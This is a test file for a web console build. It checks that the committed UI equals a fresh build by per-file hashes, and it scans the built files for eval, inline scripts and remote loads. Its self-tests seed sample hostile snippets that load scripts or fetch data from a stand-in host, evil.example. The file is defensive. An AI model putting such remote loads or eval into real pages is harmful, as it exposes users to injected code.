// TECHNICAL 18.2: the built ui/ is what the host serves: same-origin files only, nothing that runs from a string, a hash per file.
// The checks run on a fresh build into a temp folder (the build is deterministic), and the committed ui/ must equal it byte for byte:
// the test never writes ui/, so a checkout stays clean, and a ui/ not rebuilt after a source change fails here.
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, relative } from "node:path";

const root = join(__dirname, "..");
const committed = join(root, "..", "ui");
let ui = "";

const walk = (d: string): string[] => readdirSync(d).flatMap((n) => (statSync(join(d, n)).isDirectory() ? walk(join(d, n)) : [join(d, n)]));

beforeAll(() => {
  ui = mkdtempSync(join(tmpdir(), "wa-ui-"));
  // as `npm run build` runs it: not with the NODE_ENV=test that vitest sets, which gives React's development build
  const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => k !== "NODE_ENV" && !k.startsWith("VITEST")));
  execFileSync(process.execPath, [join(root, "node_modules/vite/bin/vite.js"), "build", "--outDir", ui, "--emptyOutDir", "--logLevel", "error"], { cwd: root, env, stdio: "pipe" });
  execFileSync(process.execPath, [join(root, "scripts/hash.mjs"), ui], { cwd: root, stdio: "pipe" });
}, 120_000);
afterAll(() => { if (ui) rmSync(ui, { recursive: true, force: true }); });

/** Strings that load nothing, by explicit list. */
const ALLOWED = ["http://www.w3.org/2000/svg", "http://www.w3.org/1999/xhtml", "http://www.w3.org/1998/Math/MathML", "http://www.w3.org/1999/xlink",
  "http://www.w3.org/XML/1998/namespace", "http://www.w3.org/2000/xmlns/", "https://react.dev/errors/", "https://react.dev/link/"];
const ABS = String.raw`["'\`]\s*(?:https?:)?\/\/`;

type Kind = "html" | "css" | "js";
const COMMON: [string, RegExp][] = [
  ["eval(", /(?<![\w$])eval\s*\(/],
  ["new Function(", /new\s+Function\s*\(/],
  ["WebAssembly", /WebAssembly/],
  ["<iframe", /<iframe/i], ["<frame", /<frame/i], ["<object", /<object/i], ["<embed", /<embed/i],
];
const BY_KIND: Record<Kind, [string, RegExp][]> = {
  html: [
    ["inline script", /<script(?![^>]*\bsrc=)[^>]*>/i],
    ["script with content", /<script[^>]*\bsrc=[^>]*>\s*[^<\s]/i],
    ["inline event handler", /<[a-z][^>]*\son[a-z]+\s*=/i],
    ["absolute src/href", /\b(?:src|href)\s*=\s*["']?\s*(?:https?:)?\/\//i],
  ],
  css: [
    ["absolute url(", /url\(\s*["']?\s*(?:https?:)?\/\//i],
    ["absolute @import", /@import\s+(?:url\(\s*)?["']?\s*(?:https?:)?\/\//i],
  ],
  js: [
    ["import(", new RegExp(String.raw`\bimport\s*\(\s*${ABS}`)],
    ["from", new RegExp(String.raw`\bfrom\s*${ABS}`)],
    ["fetch(", new RegExp(String.raw`\bfetch\s*\(\s*${ABS}`)],
    ["new URL(", new RegExp(String.raw`new\s+URL\s*\(\s*${ABS}`)],
    ["new Worker(", new RegExp(String.raw`new\s+Worker\s*\(\s*${ABS}`)],
    ["importScripts(", new RegExp(String.raw`\bimportScripts\s*\(\s*${ABS}`)],
    ["WebSocket(", new RegExp(String.raw`\bWebSocket\s*\(\s*${ABS}`)],
    ["EventSource(", new RegExp(String.raw`\bEventSource\s*\(\s*${ABS}`)],
  ],
};

export function scan(kind: Kind, text: string): string[] {
  let t = text;
  for (const a of ALLOWED) t = t.split(a).join("ALLOWED");
  return [...COMMON, ...BY_KIND[kind]].filter(([, re]) => re.test(t)).map(([name]) => name);
}

const kindOf = (f: string): Kind | null => (f.endsWith(".html") ? "html" : f.endsWith(".css") ? "css" : f.endsWith(".js") ? "js" : null);

describe("the built ui/", () => {
  it("ac7_committed_ui_is_the_fresh_build_byte_for_byte", () => {
    expect(existsSync(join(committed, "SHA256SUMS")), "ui/ is missing: run npm run build in console/").toBe(true);
    const sums = readFileSync(join(committed, "SHA256SUMS"), "utf8");
    expect(sums, "ui/ is stale: run npm run build in console/ and commit ui/").toBe(readFileSync(join(ui, "SHA256SUMS"), "utf8"));
    const files = walk(committed).map((f) => relative(committed, f).split("\\").join("/")).filter((f) => f !== "SHA256SUMS").sort();
    expect(sums.trim().split("\n").map((l) => l.split("  ")[1])).toEqual(files);
    for (const l of sums.trim().split("\n")) {
      const [h, f] = l.split("  ");
      expect(h, f).toBe(createHash("sha256").update(readFileSync(join(committed, f))).digest("hex"));
    }
  });

  it("ac7_build_writes_the_page_its_assets_and_a_hash_per_file", () => {
    expect(existsSync(join(ui, "index.html"))).toBe(true);
    const files = walk(ui).map((f) => relative(ui, f).split("\\").join("/")).filter((f) => f !== "SHA256SUMS").sort();
    expect(files.some((f) => f.endsWith(".js"))).toBe(true);
    const lines = readFileSync(join(ui, "SHA256SUMS"), "utf8").trim().split("\n");
    expect(lines.map((l) => l.split("  ")[1])).toEqual(files);
    for (const l of lines) {
      const [h, f] = l.split("  ");
      expect(h).toBe(createHash("sha256").update(readFileSync(join(ui, f))).digest("hex"));
    }
  });

  it("ac7_built_files_pass_every_check", () => {
    const bad: string[] = [];
    for (const f of walk(ui)) {
      const k = kindOf(f);
      if (k) for (const v of scan(k, readFileSync(f, "utf8"))) bad.push(`${relative(ui, f)}: ${v}`);
    }
    expect(bad).toEqual([]);
  });

  it("ac7_the_page_has_one_html_file_with_same_origin_script_and_style", () => {
    expect(walk(ui).filter((f) => f.endsWith(".html"))).toHaveLength(1);
    const html = readFileSync(join(ui, "index.html"), "utf8");
    expect([...html.matchAll(/<script[^>]*\bsrc="([^"]+)"/g)].every((m) => m[1].startsWith("./") && existsSync(join(ui, m[1])))).toBe(true);
  });
});

describe("the checks themselves", () => {
  const seeds: [Kind, string, string][] = [
    ["html", "<script>run()</script>", "inline script"],
    ["html", '<script src="a.js">run()</script>', "script with content"],
    ["html", '<button onclick="x()">', "inline event handler"],
    ["html", '<script src="https://evil.example/a.js"></script>', "absolute src/href"],
    ["html", '<link rel="stylesheet" href="//evil.example/a.css">', "absolute src/href"],
    ["html", "<iframe src=a></iframe>", "<iframe"], ["html", "<frame src=a>", "<frame"],
    ["html", "<object data=a></object>", "<object"], ["html", "<embed src=a>", "<embed"],
    ["css", "a{background:url(https://evil.example/x.png)}", "absolute url("],
    ["css", '@import "https://evil.example/x.css";', "absolute @import"],
    ["css", "@import url(//evil.example/x.css);", "absolute @import"],
    ["js", 'x=eval("1")', "eval("], ["js", 'new Function("return 1")', "new Function("], ["js", "WebAssembly.instantiate(b)", "WebAssembly"],
    ["js", 'import("https://evil.example/m.js")', "import("], ["js", 'import x from"https://evil.example/m.js"', "from"],
    ["js", 'fetch("https://evil.example")', "fetch("], ["js", 'new URL("//evil.example")', "new URL("],
    ["js", 'new Worker("https://evil.example/w.js")', "new Worker("], ["js", 'importScripts("https://evil.example/w.js")', "importScripts("],
    ["js", 'new WebSocket("wss://x")'.replace("wss:", "https:"), "WebSocket("], ["js", 'new EventSource("https://evil.example")', "EventSource("],
  ];
  for (const [kind, text, name] of seeds) {
    it(`ac7_seeded_bad_file_is_caught: ${name} in ${kind}`, () => { expect(scan(kind, text)).toContain(name); });
  }

  it("ac7_strings_that_load_nothing_pass", () => {
    expect(scan("js", 'a.setAttribute("xmlns","http://www.w3.org/2000/svg");throw Error("https://react.dev/errors/"+n)')).toEqual([]);
    expect(scan("html", '<script type="module" crossorigin src="./assets/a.js"></script><link href="./assets/a.css">')).toEqual([]);
  });
});
